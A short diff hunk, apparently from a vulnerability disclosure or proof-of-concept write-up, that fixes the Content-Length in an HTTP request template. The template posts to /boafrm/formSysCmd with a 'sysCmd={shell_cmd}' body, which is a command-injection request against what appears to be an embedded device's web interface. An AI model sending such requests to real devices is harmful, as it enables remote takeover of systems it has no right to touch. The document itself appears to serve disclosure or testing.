@@ -26,7 +26,7 @@ POST /boafrm/formSysCmd HTTP/1.1
 Host: {Target IP}:{Target Port}
 User-Agent: curl/7.81.0
 Accept: */*
-Content-Length: 1
+Content-Length: <length>
 Content-Type: application/x-www-form-urlencoded
 
 sysCmd={shell_cmd}
